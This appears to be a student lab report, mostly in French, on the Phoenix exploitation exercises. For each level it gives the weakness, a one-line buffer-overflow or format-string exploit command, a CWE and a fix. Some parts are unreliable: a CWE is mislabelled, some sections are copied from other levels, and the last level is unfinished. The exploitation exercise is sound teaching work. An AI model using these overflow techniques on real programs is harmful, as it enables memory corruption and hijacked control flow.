# secu-TP2

## Template 

For each level, for your report:

    identify the weakness
    try to exploit the weakness
    find CWE linked to the weakness (https://cwe.mitre.org)
    propose a remediation.

## Stack

### 3.1 Stack Zero

### Identify the Weakness

Le niveau introduit le concept que la mémoire peut être accessible en dehors de sa région allouée. Les variables sur la pile sont disposées de manière contiguë, ce qui signifie que modifier la mémoire en dehors de la zone allouée peut changer l'exécution du programme.

### Try to exploit

Dans ce niveau, un attaquant peut changer le contenu de la variable `changeme` en débordant le tampon `buffer`. En cas réelle ceci permet à l'utilisateur de notre programme de modifier une variable de notre code.
Par exemple 
```
python3 -c 'print("Attack"*15)' | ./stack-zero
```

### Remediation

La mesure corrective consiste à utiliser des fonctions sécurisées, comme `fgets`, qui limitent le nombre de caractères lus, empêchant ainsi le dépassement de tampon.

### Find CWE Linked to the Weakness

CWE-126 : Buffer Over-read

### 3.2 Stack One

#### Identify the Weakness

- Utilisation de strcpy sans contrôle de taille sur un buffer local de 64 octets.

- changeme se trouve juste après le buffer dans la pile, donc il est écrasé quand on dépasse 64 octets.

#### Try to Exploit the Weakness

- Envoyer 64 caractères de remplissage + la valeur 0x496c5962 en little-endian.

```bash 
./stack-one $(python -c 'print "A"*64 + "\x62\x59\x6c\x49"')
```

#### Find CWE Linked to the Weakness

- CWE associé : CWE-121: Stack-based Buffer Overflow.

#### Remediation

- Remplacer strcpy par une version bornée, par exemple strncpy(locals.buffer, argv[1], sizeof(locals.buffer)-1) + ajout d’un \0 final

### 3.3 Stack Two

#### Identify the Weakness

*   Utilisation de `strcpy` sans contrôle de taille sur un buffer local de 64 octets.
*   La variable `changeme` se trouve juste après le buffer dans la pile, donc elle est écrasée si on dépasse 64 octets.

#### Try to Exploit the Weakness

*   Envoyer 64 caractères de remplissage + la valeur `0x0d0a090a`
```bash
export ExploitEducation=$(python3 -c 'print("A"*64 + "\x0a\x09\x0a\x0d")')
/opt/phoenix/amd64/stack-two
```

#### Find CWE Linked to the Weakness

- CWE associé : **CWE-121: Stack-based Buffer Overflow**  
    <https://cwe.mitre.org/data/definitions/121.html>

#### Remediation

- Remplacer `strcpy` par une version sécurisée, par exemple :

```c
strncpy(locals.buffer, ptr, sizeof(locals.buffer)-1);
locals.buffer[sizeof(locals.buffer)-1] = '\0';
```

- Ou vérifier la longueur avant la copie.

### 3.4 Stack Three

#### Identify the Weakness

- gets + buffer de 64 octets + pointeur de fonction juste après → débordement de pile sur fp.

#### Try to Exploit the Weakness 

- recuperer l'adresse de complete_level avec objdump (+ -x).

- overflow de buffer puis écrasement de fp par 0x000000000040069d (en little-endian) pour appeler complete_level.

#### Find CWE Linked to the Weakness

- CWE-121: Stack-based Buffer Overflow.

#### Remediation

- remplacer gets par fgets(buffer, sizeof(buffer), stdin) et utiliser systématiquement des fonctions sûres pour les entrées utilisateur.

## 4.1 Format Zero

### Identify the Weakness

Le programme utilise `sprintf(locals.dest, buffer)` où **`buffer` est directement utilisé comme chaîne de format**, sans validation.  
Cela signifie que l’utilisateur peut injecter des **format strings** : `%n` (Écrit en mémoire le nombre de caractères imprimés), `%x`(récupère un mot de la pile et l'affiche en hexadécimale sur 4 octets) et ainsi lire ou écrire en mémoire.

### Try to Exploit the Weakness

L’objectif est de modifier `changeme` pour qu’il soit différent de 0.  
Comme `sprintf` écrit dans `locals.dest`, et que `changeme` est juste après, on peut utiliser `%n` pour écrire dans `changeme`.

Exemple d’exploitation :
```bash
python3 -c 'print("%x"*4)' | ./format-zero
```
Le `%x` force `sprintf` à écrire dans `changeme`, ce qui le rend non nul.

### Find CWE Linked to the Weakness

- **CWE‑134 – Uncontrolled Format String**
- **CWE‑120 – Classic Buffer Overflow** (indirectement, via `sprintf`)

### Remediation
- Ne jamais utiliser une chaîne de format contrôlée par l’utilisateur.
- Remplacer :

```c
sprintf(locals.dest, buffer);
```

par :

```c
snprintf(locals.dest, sizeof(locals.dest), "%s", buffer);
```

- On a spécifié explicitement la chaîne de format dans les fonctions `printf`‑like.

### 4.2 Format One

#### Identify the Weakness

- gets + buffer de 64 octets + pointeur de fonction juste après → débordement de pile sur fp.

#### Try to Exploit the Weakness 

- sprintf(locals.dest, buffer) → format string contrôlée par l'utilisateur + buffer trop petit 

#### Find CWE Linked to the Weakness

```bash
python3 -c 'print("%32x" + "lOvE")' | ./format-one
```

- %32x + "lOvE" → débordement dest[32] → changeme = 0x45764f6c.

#### Remediation

```c 
sprintf(locals.dest, "%s", buffer)
// ou 
snprintf(locals.dest, 32, "%s", buffer)
```

### 6.1 Stack Four

#### Identify the Weakness

- gets(buffer) dans start_level() lit sans limite dans un buffer de 64 octets.

- L'overflow permet d'écraser le pointeur de return de la fonction.

#### Try to Exploit the Weakness 

```bash 
objdump -d stack-four
```
ADDR_COMPLETE = 0x40061d

calcul de l'offset :

```bash
python3 -c 'print("0"*64 + "A"*8 + "B"*8 + "C"*8 + "D"*8)' | ./stack-four
# OUTPUT :
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x4444444444444444
Segmentation fault
```

0x44 = D
Donc il me faut un offset de 3*8 = 24
D'ou l acommande suivante :

```bash
python3 -c 'print("0"*88 + "\x1d\x06\x40")' | ./stack-four
```

#### Find CWE Linked to the Weakness

- CWE-121: Stack-based Buffer Overflow (débordement de tampon sur la pile via gets()).

#### Remediation

Remplacer gets() par fgets(buffer, sizeof(buffer), stdin).

### Format Two

#### Identify the Weakness

- gets(buffer) dans start_level() lit sans limite dans un buffer de 64 octets.

- L'overflow permet d'écraser le pointeur de return de la fonction.

#### Try to Exploit the Weakness 

```bash 
objdump -t ./format-two
```

0000000000600af0 g     O .bss	0000000000000004 changeme

d'ou l'adresse : 0x600af0



#### Find CWE Linked to the Weakness



#### Remediation

